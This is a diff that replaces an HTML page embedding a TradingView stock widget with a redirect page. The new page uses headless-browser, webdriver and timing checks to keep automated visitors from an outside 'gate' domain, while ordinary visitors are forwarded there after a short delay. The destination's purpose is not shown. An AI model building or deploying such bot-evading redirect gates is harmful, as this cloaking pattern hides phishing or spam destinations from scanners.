@@ -1,66 +1,116 @@
-<!DOCTYPE html>
-<html>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <head>
-    <style>
-    table, th, td {
-      border: 1px solid black;
-      font-size: 50px;
-      margin: 20px;
-      padding: 10px;
-    }
-    p {
-      font-size: 70px;
-    }
-    .content {
-    margin: auto;
-    width: 90mm;
-    }
-    </style>
-  </head>
-  <body>
-    <div class="content">
-      <center>
-       <!-- TradingView Widget BEGIN -->
-<div class="tradingview-widget-container">
-  <div class="tradingview-widget-container__widget"></div>
-  <div class="tradingview-widget-copyright"><a href="https://www.tradingview.com" rel="noopener" target="_blank"><span class="blue-text">Stocks</span></a> by TradingView</div>
-  <script type="text/javascript" src="https://s3.tradingview.com/external-embedding/embed-widget-market-overview.js" async>
-  {
-  "colorTheme": "light",
-  "dateRange": "12M",
-  "showChart": true,
-  "locale": "en",
-  "width": "100%",
-  "height": "100%",
-  "largeChartUrl": "",
-  "isTransparent": true,
-  "showSymbolLogo": false,
-  "showFloatingTooltip": false,
-  "plotLineColorGrowing": "rgba(41, 98, 255, 1)",
-  "plotLineColorFalling": "rgba(41, 98, 255, 1)",
-  "gridLineColor": "rgba(240, 243, 250, 0)",
-  "scaleFontColor": "rgba(120, 123, 134, 1)",
-  "belowLineFillColorGrowing": "rgba(41, 98, 255, 0)",
-  "belowLineFillColorFalling": "rgba(41, 98, 255, 0)",
-  "belowLineFillColorGrowingBottom": "rgba(41, 98, 255, 0)",
-  "belowLineFillColorFallingBottom": "rgba(41, 98, 255, 0)",
-  "symbolActiveColor": "rgba(41, 98, 255, 0.12)",
-  "tabs": [
-    {
-      "title": "Stocks",
-      "symbols": [
-        {
-          "s": "XETR:VWCE"
-        }
-      ]
-    }
-  ]
-}
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="robots" content="noindex,nofollow" />
+  <title>Redirecting…</title>
+
+  <!-- Fallback: if JS is disabled, do nothing (prevents many dumb bots from following) -->
+  <noscript>
+    <style>body{font-family:system-ui;margin:2rem;}</style>
+    <p>This page requires JavaScript.</p>
+  </noscript>
+
+  <style>
+    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif; margin: 2rem; }
+    .box { max-width: 520px; padding: 1.25rem 1.25rem; border: 1px solid #ddd; border-radius: 12px; }
+    .muted { color: #666; font-size: 0.95rem; }
+    button { padding: 0.75rem 1rem; border-radius: 10px; border: 1px solid #111; background:#111; color:#fff; cursor:pointer; }
+    button:disabled { opacity: 0.5; cursor: not-allowed; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h1>One moment…</h1>
+    <p class="muted">Preparing your link.</p>
+    <button id="go" disabled>Continue</button>
+    <p id="msg" class="muted"></p>
+  </div>
+
+  <script>
+    (function () {
+      // CHANGE THIS to your Cloudflare gate domain
+      const GATE_URL = "https://reddirector.space/"; // must be https
+
+      const msgEl = document.getElementById("msg");
+      const btn = document.getElementById("go");
+
+      // quick-and-dirty signals (NOT security, just friction)
+      function looksBotty() {
+        const nav = navigator || {};
+        const ua = (nav.userAgent || "").toLowerCase();
+
+        // common automation hints
+        if (nav.webdriver) return true;
+        if (!nav.cookieEnabled) return true;
+
+        // very old / empty UA often indicates scripts
+        if (!ua || ua.length < 10) return true;
+
+        // headless hints (not reliable)
+        if (ua.includes("headless") || ua.includes("phantomjs")) return true;
+
+        // no screen or tiny screen can be suspicious (still not reliable)
+        if (!window.screen || window.screen.width < 200 || window.screen.height < 200) return true;
+
+        return false;
+      }
+
+      // lightweight token for your own tracking (not a security token)
+      function randToken() {
+        const arr = new Uint8Array(8);
+        crypto.getRandomValues(arr);
+        return Array.from(arr).map(b => b.toString(16).padStart(2, "0")).join("");
+      }
+
+      // preserve query params from the marketing URL
+      const current = new URL(window.location.href);
+      const out = new URL(GATE_URL);
+
+      // copy UTM etc.
+      current.searchParams.forEach((v, k) => out.searchParams.set(k, v));
+
+      // annotate source
+      out.searchParams.set("src", "githubio");
+      out.searchParams.set("t", randToken());
+
+      // Add a tiny timing check: require page to be open for a moment
+      const start = performance.now();
+
+      function enableContinue() {
+        btn.disabled = false;
+        btn.addEventListener("click", () => {
+          // If someone clicks instantly (< 350ms), treat as botty and just stop.
+          const elapsed = performance.now() - start;
+          if (elapsed < 350) {
+            msgEl.textContent = "Please wait a moment and try again.";
+            return;
+          }
+          window.location.replace(out.toString());
+        });
+      }
+
+      // If it looks very botty, don't auto-redirect.
+      // Show the button instead (adds friction and reduces automated hits).
+      if (looksBotty()) {
+        msgEl.textContent = "Tap Continue to proceed.";
+        enableContinue();
+        return;
+      }
+
+      // For normal users: short delay then redirect.
+      // Delay helps cut some ultra-basic fetchers.
+      setTimeout(() => {
+        window.location.replace(out.toString());
+      }, 700);
+
+      // Also allow manual click if redirect blocked
+      setTimeout(() => {
+        msgEl.textContent = "If you’re not redirected, press Continue.";
+        enableContinue();
+      }, 1200);
+    })();
   </script>
-</div>
-<!-- TradingView Widget END -->
-        </center>
-    </div>
-  </body>
+</body>
 </html>
